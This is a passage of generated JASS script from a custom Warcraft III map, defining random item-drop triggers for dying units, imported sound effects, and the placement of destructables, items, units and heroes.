call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mC takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($4930384D,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($4930384B,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($4930384C,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mD takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304759,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mE takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49303044,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mF takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304B57,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mG takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49303935,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mH takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304757,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304754,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304755,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mI takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304D33,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mJ takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($4930344D,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303531,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303532,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303530,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mK takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($4930344E,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mL takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49303857,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($4930384E,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303850,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($4930384F,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mM takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49303852,80)
call RandomDistAddItem(-1,20)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303853,80)
call RandomDistAddItem(-1,20)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49303936,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mN takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49305732,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mO takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304150,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304F4C,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mP takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304244,50)
call RandomDistAddItem($49304245,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304248,50)
call RandomDistAddItem($49304246,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304247,50)
call RandomDistAddItem($49304249,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mQ takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304232,50)
call RandomDistAddItem($49304235,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304237,50)
call RandomDistAddItem($49304236,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
call RandomDistReset()
call RandomDistAddItem($49304234,50)
call RandomDistAddItem($49304233,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mR takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304D30,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mS takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304D46,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mT takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49304839,50)
call RandomDistAddItem(-1,50)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mU takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49303737,100)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mV takes nothing returns nothing
local widget Hd=null
local unit He=null
local integer Hg=0
local boolean Hf=true
set Hd=bj_lastDyingWidget
if Hd==null then
set He=GetTriggerUnit()
endif
if He!=null then
set Hf=not IsUnitHidden(He)
if Hf and GetChangingUnit()!=null then
set Hf=GetChangingUnitPrevOwner()==Player(PLAYER_NEUTRAL_AGGRESSIVE)
endif
endif
if Hf then
call RandomDistReset()
call RandomDistAddItem($49305132,30)
call RandomDistAddItem(-1,70)
set Hg=RandomDistChoose()
if He!=null then
call UnitDropItem(He,Hg)
else
call WidgetDropItem(Hd,Hg)
endif
endif
set bj_lastDyingWidget=null
call DestroyTrigger(GetTriggeringTrigger())
set He=null
set Hd=null
endfunction
function mW takes nothing returns nothing
set C=CreateSound("war3mapImported\\pole_letter_correct.mp3",false,false,false,10,10,"")
call SetSoundDuration(C,1257)
call SetSoundChannel(C,0)
call SetSoundVolume(C,127)
call SetSoundPitch(C,1.)
set D=CreateSound("war3mapImported\\v1lat_-_JEto_nenormalno_jeto_nechestno_66392426.mp3",false,false,false,10,10,"")
call SetSoundDuration(D,5806)
call SetSoundChannel(D,0)
call SetSoundVolume(D,127)
call SetSoundPitch(D,1.)
set E=CreateSound("war3mapImported\\-_Eto._Prosto._Nechto._(Gybka.com).mp3",false,false,false,10,10,"")
call SetSoundDuration(E,5466)
call SetSoundChannel(E,0)
call SetSoundVolume(E,127)
call SetSoundPitch(E,1.)
set F=CreateSound("war3mapImported\\Dota_2_-_Ajj-ajj-ajj-ajj-ajj_chto_sejjchas_proizoshlo_67488059.mp3",false,false,false,10,10,"")
call SetSoundDuration(F,5043)
call SetSoundChannel(F,0)
call SetSoundVolume(F,127)
call SetSoundPitch(F,1.)
set G=CreateSound("war3mapImported\\Lakad Matataaag! - NORMALIN NORMALIN!! (www.hotplayer.ru).mp3",false,false,false,10,10,"")
call SetSoundDuration(G,5649)
call SetSoundChannel(G,0)
call SetSoundVolume(G,127)
call SetSoundPitch(G,1.)
endfunction
function mX takes nothing returns nothing
local destructable Hb
local trigger Hc
set G8=CreateDestructable($41546731,-13568.,-15232.,270.,.9,0)
set G9=CreateDestructable($41546733,-12928.,-16064.,0.,.9,0)
set HB=CreateDestructable($41546733,-12160.,-16064.,0.,.9,0)
set HC=CreateDestructable($41547472,-13312.,-9600.,270.,1.732,0)
set HD=CreateDestructable($41547472,-13248.,-9472.,270.,1.739,4)
set HE=CreateDestructable($41547472,-12480.,-15744.,270.,1.61,4)
set HF=CreateDestructable($41547472,-13376.,-9472.,270.,1.72,4)
set HG=CreateDestructable($42303035,11264.,5376.,3.593,1.5,0)
set HH=CreateDestructable($42303037,-11712.,2496.,270.,1.,0)
set HI=CreateDestructable($42303037,3200.,-23616.,270.,1.,0)
set HJ=CreateDestructable($42303037,3328.,-23616.,270.,1.,0)
set HK=CreateDestructable($42303037,-11904.,2688.,270.,1.,0)
set HL=CreateDestructable($42303037,-11776.,2624.,270.,1.,0)
set HM=CreateDestructable($42303037,-12160.,2688.,270.,1.,0)
set HN=CreateDestructable($42303037,-12096.,2560.,270.,1.,0)
set HO=CreateDestructable($42303037,-12032.,2688.,270.,1.,0)
set HP=CreateDestructable($42303037,-11840.,2496.,270.,1.,0)
set HQ=CreateDestructable($42303037,-11968.,2560.,270.,1.,0)
set HR=CreateDestructable($42303038,-4096.,-12352.,270.,1.,0)
set HS=CreateDestructable($42303038,-4160.,-12480.,270.,1.,0)
set HT=CreateDestructable($42303038,-4096.,-11968.,270.,1.,0)
set HU=CreateDestructable($42303038,-4096.,-12224.,270.,1.,0)
set HV=CreateDestructable($42303038,-4096.,-12096.,270.,1.,0)
set HW=CreateDestructable($42303041,-768.,-14144.,0.,.9,0)
set HX=CreateDestructable($42303041,-1280.,-14144.,0.,.9,0)
set HY=CreateDestructable($44546735,-5312.,14592.,270.,1.3,0)
set HZ=CreateDestructable($44546735,23616.,4224.,270.,1.3,0)
set Ha=CreateDestructable($44546C76,-2208.,13792.,297.,1.03,0)
set Hb=CreateDestructable($4C546273,-13536.,-10272.,306.,1.142,0)
set Hc=CreateTrigger()
call TriggerRegisterDeathEvent(Hc,Hb)
call TriggerAddAction(Hc,function SaveDyingWidget)
call TriggerAddAction(Hc,function mV)
set Hb=CreateDestructable($4C546273,1568.,7840.,306.,1.142,0)
set Hc=CreateTrigger()
call TriggerRegisterDeathEvent(Hc,Hb)
call TriggerAddAction(Hc,function SaveDyingWidget)
call TriggerAddAction(Hc,function mU)
set Hh=CreateDestructable($4C546731,6976.,4736.,270.,.9,0)
set Hi=CreateDestructable($59546663,-1408.,-14016.,270.,1.,0)
set Hj=CreateDestructable($59546663,-1408.,-14144.,270.,1.,0)
set Hk=CreateDestructable($59546663,-1408.,-14272.,270.,1.,0)
set Hl=CreateDestructable($59546663,-3328.,-12096.,270.,1.,0)
set Hm=CreateDestructable($59546663,-3328.,-12224.,270.,1.,0)
set Hn=CreateDestructable($5A546436,2304.,4608.,0.,.9,0)
set Ho=CreateDestructable($5A546438,512.,12160.,180.,.9,0)
set Hp=CreateDestructable($5A546733,2368.,11968.,0.,.9,0)
set Hq=CreateDestructable($5A547463,2144.,4320.,270.,1.632,0)
set Hr=CreateDestructable($5A547477,-6912.,9856.,270.,1.452,3)
set Hs=CreateDestructable($5A547477,-3456.,-12160.,270.,1.467,2)
set Hc=null
set Hb=null
endfunction
function mY takes nothing returns nothing
call CreateItem($4930504B,-13872.1,-9909.1)
call CreateItem($4930504B,-12062.4,-10396.)
call CreateItem($4930504C,-4126.3,-4776.3)
call CreateItem($4930504C,2391.7,-4311.9)
call CreateItem($4930504C,-3995.5,-4958.4)
call CreateItem($4930504D,-5211.6,2536.6)
call CreateItem($4930504D,-232.6,6624.6)
call CreateItem($4930504E,-10328.4,450.8)
call CreateItem($4930504E,5420.8,6497.7)
call CreateItem($4930504E,1453.9,-4071.5)
call CreateItem($4930504E,4832.2,-7845.8)
call CreateItem($4930504E,7858.,146.)
call CreateItem($4930504E,17207.8,10714.1)
call CreateItem($4930504E,-14420.9,-10342.5)
call CreateItem($4930514E,-11751.,6534.2)
call CreateItem($4930514E,2134.4,-4371.5)
call CreateItem($4930514E,-9238.2,12964.9)
call CreateItem($4930514E,-9320.1,14447.)
call CreateItem($4930514E,-7264.3,2946.2)
call CreateItem($4930514E,-10011.6,-7442.5)
call CreateItem($4930514E,-12572.7,-12527.2)
call CreateItem($4930514E,2219.7,11621.6)
call CreateItem($4930514E,-16079.2,7568.6)
call CreateItem($4930514E,-10254.3,11477.9)
call CreateItem($4930514E,-5396.4,8138.4)
call CreateItem($4930514E,-2271.1,13969.7)
call CreateItem($4930514E,-3047.8,-11264.3)
call CreateItem($4930514E,-14405.2,-11928.1)
call CreateItem($4930514E,-12989.9,-8667.4)
call CreateItem($4930514E,1159.4,-9890.6)
call CreateItem($4930514E,1939.7,12944.6)
call CreateItem($4930514E,-15670.9,-9628.8)
call CreateItem($4930514E,-9440.5,-4670.3)
call CreateItem($4930514E,-10444.4,286.)
call CreateItem($4930514E,-4131.6,12771.9)
call CreateItem($4930514E,-5427.6,-5791.)
call CreateItem($4930514E,-8986.1,-13453.)
call CreateItem($4930514E,-11021.9,-9241.7)
call CreateItem($4930514E,1928.9,3420.7)
call CreateItem($4930514E,3821.9,4947.2)
call CreateItem($4930514E,-2945.4,3815.4)
call CreateItem($4930514E,2718.5,-3146.4)
call CreateItem($4930514E,-676.3,-380.2)
call CreateItem($6863756E,-5962.9,629.9)
call CreateItem($6863756E,-14870.2,-3097.9)
call CreateItem($6863756E,-13507.6,-8022.6)
call CreateItem($6863756E,-8136.2,2306.7)
call CreateItem($6863756E,-6553.2,-2065.9)
call CreateItem($6863756E,-10448.5,-6278.4)
call CreateItem($6863756E,-6653.,-4491.2)
call CreateItem($6863756E,-9566.9,-5239.3)
call CreateItem($77637963,-10889.9,-14213.3)
call CreateItem($77637963,-12384.6,-11594.4)
call CreateItem($77637963,-11926.1,-9304.5)
call CreateItem($77637963,-8747.3,-8340.5)
call CreateItem($77637963,-4633.3,-8660.2)
call CreateItem($77637963,-4333.2,-11870.)
call CreateItem($77637963,-7326.6,-14333.4)
call CreateItem($77637963,-7849.5,-10829.3)
endfunction
function mZ takes nothing returns nothing
local player Ht=Player(0)
local unit Hu
set KG=CreateUnit(Ht,$68303452,8817.7,-23161.3,264.589)
set Hu=CreateUnit(Ht,$68303042,-16024.7,15545.2,90.211)
set Hu=null
endfunction
function ma takes nothing returns nothing
local player Ht=Player(1)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-15963.7,15611.1,90.21)
set Hu=null
endfunction
function mb takes nothing returns nothing
local player Ht=Player(2)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-15924.4,15596.6,90.21)
set Hu=null
endfunction
function mc takes nothing returns nothing
local player Ht=Player(3)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-15898.5,15570.1,90.21)
set Hu=null
endfunction
function md takes nothing returns nothing
local player Ht=Player(4)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-15910.3,15523.6,90.21)
set Hu=null
endfunction
function me takes nothing returns nothing
local player Ht=Player(5)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-15953.8,15496.,90.21)
set Hu=null
endfunction
function mf takes nothing returns nothing
local player Ht=Player(6)
local unit Hu
set Hu=CreateUnit(Ht,$68303042,-16007.3,15596.6,90.21)
set Hu=CreateUnit(Ht,$68303042,-16008.6,15499.9,90.21)
set Hu=null
endfunction
function mg takes nothing returns nothing
local player Ht=Player(8)
local unit Hu
set Hu=CreateUnit(Ht,$6E666F68,-13696.,1024.,270.)
set Hu=CreateUnit(Ht,$68626C61,-15872.,-960.,270.)
set Hu=CreateUnit(Ht,$6E677772,-11424.,480.,270.)
set Hu=CreateUnit(Ht,$6E656635,-11104.,544.,270.)
set IK=CreateUnit(Ht,$68626C61,6784.,-1664.,270.)
set IL=CreateUnit(Ht,$6E303333,8064.,-1952.,270.)
set Hu=CreateUnit(Ht,$6F777477,17984.,2112.,270.)
set Hu=CreateUnit(Ht,$6F777477,18624.,2112.,270.)
set Hu=CreateUnit(Ht,$6F777477,18688.,1216.,270.)
set Hu=CreateUnit(Ht,$6F666F72,18144.,1312.,270.)
set Hu=CreateUnit(Ht,$6E656635,-11872.,-1056.,270.)
set Hu=CreateUnit(Ht,$6E656631,-11040.,-96.,270.)
set Hu=CreateUnit(Ht,$6E65666D,-12896.,2720.,270.)
set Hu=null
endfunction
function mh takes nothing returns nothing
local player Ht=Player(8)
local unit Hu
local real I2
set KH=CreateUnit(Ht,$456B6565,-11707.,193.,252.11)
call SetUnitState(KH,UNIT_STATE_MANA,54)
set Hu=CreateUnit(Ht,$48303635,-16187.1,14558.9,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call SelectHeroSkill(Hu,$41305037)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call SelectHeroSkill(Hu,$41305048)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305047)
call SelectHeroSkill(Hu,$41305047)
call SelectHeroSkill(Hu,$41305047)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305339)
call SelectHeroSkill(Hu,$41305339)
call SelectHeroSkill(Hu,$41305339)
call SelectHeroSkill(Hu,$41305339)
call SelectHeroSkill(Hu,$41305339)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call SelectHeroSkill(Hu,$4130505A)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305743,0)
set Hu=CreateUnit(Ht,$68777432,-14491.,457.5,308.85)
set KI=CreateUnit(Ht,$6E73716F,-11128.3,756.7,125.83)
call SetUnitState(KI,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$48303636,-16046.9,14797.4,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41313653)
call SelectHeroSkill(Hu,$41313653)
